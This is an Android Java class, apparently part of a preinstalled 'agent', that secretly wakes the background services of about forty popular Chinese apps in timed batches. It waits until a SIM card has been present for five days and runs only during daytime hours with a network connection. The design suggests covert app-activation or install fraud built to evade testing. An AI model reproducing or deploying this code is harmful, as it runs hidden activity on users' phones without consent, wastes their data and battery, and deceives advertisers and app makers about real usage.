package com.dx.agent2.thread;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.telephony.TelephonyManager;
import android.text.TextUtils;

import com.dx.utils.Log;
import com.dx.utils.SpUtil;
import com.dx.utils.ZThreadPool;
import com.dx.utils.ZThreadPool.ZThread;

public class ThreadStartAppsTiming extends ZThread {
    public static final String TAG = "ThreadStartAppsTiming";

    /** 下一个启动的间隔时间 18秒 **/
    public final long INTERVAL_18S = 18000;
    /** 下一次轮询的间隔时间 1时 **/
    public final long INTERVAL_1H = 3600000;
    /** 再一次开始的间隔时间 3时 **/
    public final long INTERVAL_3H = 10800000;

    private Context mContext;
    private SpUtil spUtil;
    private PackageManager pm;
    private ConnectivityManager cm;
    private TelephonyManager tm;
    private Map<String, String> map;
    private boolean needsQuit = false;
    private List<String> pkgs;
    private int length = 0;
    private int simCardDay = 0;

    public ThreadStartAppsTiming(Context context, ZThreadPool parent) {
        super(parent, TAG);
        this.mContext = context;
        this.pm = mContext.getPackageManager();
        this.cm = (ConnectivityManager) mContext.getSystemService(Context.CONNECTIVITY_SERVICE);
        this.tm = (TelephonyManager) mContext.getSystemService(Context.TELEPHONY_SERVICE);
        this.spUtil = SpUtil.getInstance(mContext);
        this.pkgs = spUtil.getPkgList(SpUtil.SP_INSTALLED_APPS);
        this.length = pkgs.size();
        this.simCardDay = 5;
        this.needsQuit = length == 0;
        if (!needsQuit) {
            initMap();
        }
    }

    @Override
    public void core_run() throws Exception {
        while (!needsQuit) {
            if (isCanStart()) {
                int i = spUtil.getInt(SpUtil.SP_I, 0);
                if (i == 0) {
                    List<String> tempPkgs = new ArrayList<String>();
                    List<PackageInfo> pis = pm.getInstalledPackages(0);
                    for (PackageInfo pi : pis) {
                        String pkg = pi.packageName;
                        if (pkgs.contains(pkg) && !TextUtils.isEmpty(map.get(pkg))) {
                            tempPkgs.add(pkg);
                        }
                    }
                    pkgs = tempPkgs;
                    length = pkgs.size();
                }

                if (length == 0) {
                    spUtil.putString(SpUtil.SP_INSTALLED_APPS, "");
                    needsQuit = true;
                    Log.saveLog2File(TAG, "pkgs is empty, so finished", TAG);
                } else {
                    if (i == 0) {
                        spUtil.putString(SpUtil.SP_INSTALLED_APPS, pkgs.toString().replace("[", "").replace("]", "")
                                .replaceAll(", ", "]"));
                    }
                    int index = spUtil.getInt(SpUtil.SP_INDEX, 0);
                    if (index < length) {// 该启动的应用下标<长度，启动应用
                        Log.saveLog2File(TAG, index + "<" + length + ", next start", TAG);
                        if (i < 3) {
                            String pkg = pkgs.get(index);
                            startAppService4Name(pkg, map.get(pkg));
                            spUtil.putInt(SpUtil.SP_INDEX, index + 1);
                            spUtil.putInt(SpUtil.SP_I, i + 1);
                            Log.saveLog2File(TAG, "i<3, start[" + pkg + "], sleep 18s", TAG);
                            Thread.sleep(INTERVAL_18S);
                        } else {
                            spUtil.putInt(SpUtil.SP_I, 0);
                            spUtil.putLastStartTime(System.currentTimeMillis());
                            Log.saveLog2File(TAG, "i>=3, reset i, sleep 1h", TAG);
                            Thread.sleep(INTERVAL_1H);
                        }
                    } else {// 该启动的应用下标>=长度，重置下标
                        spUtil.putInt(SpUtil.SP_INDEX, 0);
                        spUtil.putStartedCount(spUtil.getStartedCount() + 1);
                        Log.saveLog2File(TAG,
                                index + ">=" + length + ", reset index, started count=" + spUtil.getStartedCount()
                                        + ", sleep 18s", TAG);
                        Thread.sleep(INTERVAL_18S);
                    }
                }
            } else {
                Log.e(TAG, "isCanStart(false) sleep 10min");
                Thread.sleep(10 * 60000);// 10分钟
            }
        }
    }

    public void startAppService4Name(String key, String value) {
        String[] names = value.split(",");
        for (int i = 0; i < names.length; i++) {
            try {
                Intent service = new Intent();
                ComponentName cn = new ComponentName(key, names[i]);
                service.setComponent(cn);
                Log.e(TAG, service.getComponent().toString());
                mContext.startService(service);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    /** 有SIM卡且插卡达到规定天数以上，有网，距离上次启动超过3小时，8<=当前时间<=23 **/
    private boolean isCanStart() {
        boolean isCan = checkFirstSimCardTime(tm);
        if (!isCan) {
            return false;
        }
        NetworkInfo ni = cm.getActiveNetworkInfo();
        if (ni != null && (ni.isAvailable() && ni.isConnected())) {
            long current = System.currentTimeMillis();
            if (current - spUtil.getLastStartTime() > INTERVAL_3H) {
                Calendar c = Calendar.getInstance(Locale.getDefault());
                c.setTimeInMillis(current);
                String hour = String.format(Locale.getDefault(), "%02d", c.get(Calendar.HOUR_OF_DAY));
                if (hour.startsWith("0")) {
                    hour = hour.substring(1, 2);
                }
                int time = Integer.valueOf(hour);
                if (time >= 8 && time <= 23) {
                    Log.e(TAG, "isCanStart() yes network, yes 8~23");
                    isCan = true;
                } else {
                    Log.saveLog2File(TAG, "isCanStart() yes network, not 8~23", TAG);
                    isCan = false;
                }
            } else {
                Log.saveLog2File(TAG, "isCanStart() yes network, not interval", TAG);
                isCan = false;
            }
        } else {
            Log.saveLog2File(TAG, "isCanStart() not network", TAG);
            isCan = false;
        }
        return isCan;
    }

    private boolean checkFirstSimCardTime(TelephonyManager tm) {
        boolean isOk = spUtil.needsCheckSimCardTime();
        if (!isOk) {
            return true;
        }
        if (tm != null) {
            int state = tm.getSimState();
            switch (state) {
            case TelephonyManager.SIM_STATE_ABSENT:
            case TelephonyManager.SIM_STATE_UNKNOWN:
                isOk = false;
                break;
            case TelephonyManager.SIM_STATE_READY:
                isOk = true;
                break;
            default:
                isOk = true;
                break;
            }
        }
        if (isOk) {
            long current = System.currentTimeMillis();
            long first = spUtil.getFirstSimCardTime();
            if (first == 0) {
                spUtil.putFirstSimCardTime(current);
            }
            if (current - first > simCardDay * 24 * 3600000) {
                Log.e(TAG, "isCanStart() yes sim card, time >" + simCardDay + " day");
                spUtil.putBoolean(SpUtil.SP_NEEDS_CHECK_SIM_CARD_TIME, false);
                isOk = true;
            } else {
                Log.e(TAG, "isCanStart() yes sim card, time <=" + simCardDay + " day");
                isOk = false;
            }
        } else {
            Log.e(TAG, "isCanStart() not sim card");
            isOk = false;
        }
        return isOk;
    }

    private void initMap() {
        map = new HashMap<String, String>();
        /** 日历 **/
        map.put("cn.etouch.ecalendar.cpa",
                "com.umeng.message.UmengService,com.umeng.message.UmengMessageIntentReceiverService");
        /** JJ斗地主 cn.jj **/
        /** 酷我音乐 **/
        // cn.kuwo.player.permission.ACCESS_KUWO_SERVICE
        map.put("cn.kuwo.player", "cn.kuwo.mod.push.PushService,cn.kuwo.service.remote.RemoteService");
        /** 牙牙关注 **/
        map.put("com.attention.app", "cn.jpush.android.service.DaemonService");
        /** 百度手机助手 **/
        // com.baidu.appsearch.permission.LAUNCH->WebsuiteService
        map.put("com.baidu.appsearch",// 网站启动，启动优化程序
                "com.baidu.appsearch.websuite.WebsuiteService,com.baidu.appsearch.silent.EmptyService");
        /** 百度地图 **/
        map.put("com.baidu.BaiduMap", "com.baidu.android.moplus.MoPlusService");
        /** 百度浏览器 **/
        map.put("com.baidu.browser.apps_sj",
                "com.baidu.android.pushservice.PushService,com.baidu.sapi2.share.ShareService");
        /** 手机百度 **/
        map.put("com.baidu.searchbox", "com.baidu.android.pushservice.PushService,com.baidu.sapi2.share.ShareService");
        /** 掌阅iReader **/
        map.put("com.chaozh.iReaderFree", "io.yunba.android.core.YunBaService");
        /** 大众点评 com.dianping.v1 **/
        /** 百度手机卫士 **/
        map.put("com.dianxinos.optimizer.channel",// 从守护进程启动，检查更新，支付安全，分享服务
                "com.dianxinos.optimizer.OptimizerStartupService,com.dianxinos.appupdate.AppUpdateService,com.dianxinos.optimizer.module.paysecurity.PaySecurityService,com.baidu.sapi2.share.ShareService");
        /** 安卓助手 **/
        map.put("com.easou.androidhelper",
                "com.easou.androidhelper.business.main.service.EasouLocalService,com.umeng.message.UmengService,com.umeng.message.UmengMessageIntentReceiverService");
        /** 沃划算 **/
        map.put("com.example.screenunlock",
                "com.baidu.android.pushservice.CommandService,com.baidu.android.pushservice.PushService");
        /** 凤凰新闻 **/
        map.put("com.ifeng.news2",
                "com.xiaomi.mipush.sdk.PushMessageHandler,com.ifeng.news2.exception.SendErrorReportService");
        /** 陌陌 **/
        map.put("com.immomo.momo", "com.taobao.munion.base.download.DownloadingService");
        /** 爱阅读 **/
        map.put("com.iyd.reader.ReadingJoy",
                "com.tencent.android.tpush.service.XGPushService,com.tencent.android.tpush.rpc.XGRemoteService");
        /** 欢乐斗地主 com.kukool.game.ddz.yyh **/
        /** 修机佬 **/
        map.put("com.maotao.app.release", "cn.jpush.android.service.DaemonService");
        /** 应用商店 **/
        map.put("com.market.chenxiang",
                "com.phonemanager2345.zhushou.ConnectionService,com.service.usbhelpersdk.service.SdkHelperService");
        /** 手机助手 **/
        map.put("com.market2345",
                "com.phonemanager2345.zhushou.ConnectionService,com.service.usbhelpersdk.service.SdkHelperService");
        /** 墨迹天气 **/
        map.put("com.moji.mjweather", "com.igexin.sdk.PushService");
        /** 360手机助手 **/
        map.put("com.qihoo.appstore",
                "com.qihoo.appstore.PermForwardService,com.qihoo360.mobilesafe.pcdaemon.service.DaemonService,com.qihoo.appstore.newvideo.VideoMiniService,com.qihoo.appstore.clear.ScannerTrashService,com.qihoo360.accounts.sso.svc.AccountService,com.qihoo.appstore.clear.MemCleanService");
        /** 360浏览器 **/
        map.put("com.qihoo.browser",
                "com.qihoo.browser.pushmanager.PushBrowserService,com.qihoo360.accounts.sso.svc.AccountService");
        /** 360卫士 **/
        map.put("com.qihoo360.mobilesafe",
                "com.qihoo.antivirus.autostart.bind.AutoStartServiceForMobilesafe,com.qihoo360.mobilesafe.service.SafeManageService,com.qihoo360.mobilesafe.service.helper.GuardHelperService,com.qihoo360.mobilesafe.blockmanagement.BlockCentralService,com.qihoo360.mobilesafe.support.qpush.QihooPushService");
        /** 爱奇艺视频 **/
        map.put("com.qiyi.video",
                "org.qiyi.android.commonphonepad.service.MultiDeviceCoWorkService,com.sdk.communication.SocketSer,com.baidu.android.moplus.MoPlusService,com.baidu.android.pushservice.PushService,com.iqiyi.sso.sdk.service.SleepyAccountsService");
        /** 人人-美颜美图P图 **/
        map.put("com.renren.camera.android",
                "com.renren.camera.android.lbs.LocationService,com.renren.camera.android.plugin.natives.simi.FloatService,com.renren.camera.android.plugin.natives.simi.monster.MonsterNotification,com.xiaomi.mipush.sdk.PushMessageHandler,com.renren.camera.android.news.NewsPushService,com.renren.camera.android.ui.PullUnloginNewsService");
        /** 美团 com.sankuai.meituan **/
        /** 搜狗搜索 **/
        map.put("com.sogou.activity.src",
                "com.sogou.udp.push.PushService,com.sogou.udp.push.SGPushMessageService,com.sogou.activity.src.SogouSearchService");
        /** 搜狗市场 **/
        map.put("com.sogou.appmall", "com.sogou.udp.push.PushService,com.sogou.udp.push.SGPushMessageService");
        /** 搜狗输入法 com.sohu.inputmethod.sogou **/
        /** 搜狐新闻 **/
        map.put("com.sohu.newsclient", "com.sohu.push.service.PushService,com.sohu.news.mp.sp.SohuNewsService");
        /** 今日头条 **/
        map.put("com.ss.android.article.news",
                "com.ss.android.article.base.app.ArticleWidgetService2,com.ss.android.newmedia.pay.WXPayService,com.ss.android.message.log.LogService,com.xiaomi.mipush.sdk.PushMessageHandler,com.ss.android.message.NotifyService,com.umeng.message.UmengService,com.umeng.message.UmengMessageIntentReceiverService");
        /** 手机淘宝 **/
        map.put("com.taobao.taobao", "com.taobao.android.sso.internal.PidGetterService,com.taobao.agoo.PushService");
        /** 微信 **/
        map.put("com.tencent.mm",
                "com.tencent.mm.plugin.accountsync.model.AccountAuthenticatorService,com.tencent.mm.plugin.accountsync.model.ContactsSyncService");
        /** 腾讯新闻 **/
        map.put("com.tencent.news", "com.xiaomi.mipush.sdk.PushMessageHandler,com.tencent.news.push.PushService");
        /** 腾讯视频 **/
        map.put("com.tencent.qqlive",
                "com.xiaomi.mipush.sdk.PushMessageHandler,com.tencent.qqlive.assist.GeneralService");
        /** 天天快报 **/
        map.put("com.tencent.reading", "com.xiaomi.mipush.sdk.PushMessageHandler,com.tencent.reading.push.PushService");
        /** UC浏览器 **/
        map.put("com.UCMobile", "com.ucweb.message.PushService,com.ucweb.message.UcwebMessageIntentReceiverService");
        /** 喜马拉雅听书 **/
        map.put("com.ximalaya.ting.android",
                "com.baidu.android.pushservice.PushService,com.igexin.sdk.PushService,com.taobao.munion.base.download.DownloadingService");
        /** 一点资讯 **/
        map.put("com.yidian.dk", "com.xiaomi.mipush.sdk.PushMessageHandler");
        /** 天气通 sina.mobile.tianqitong **/
    }
}
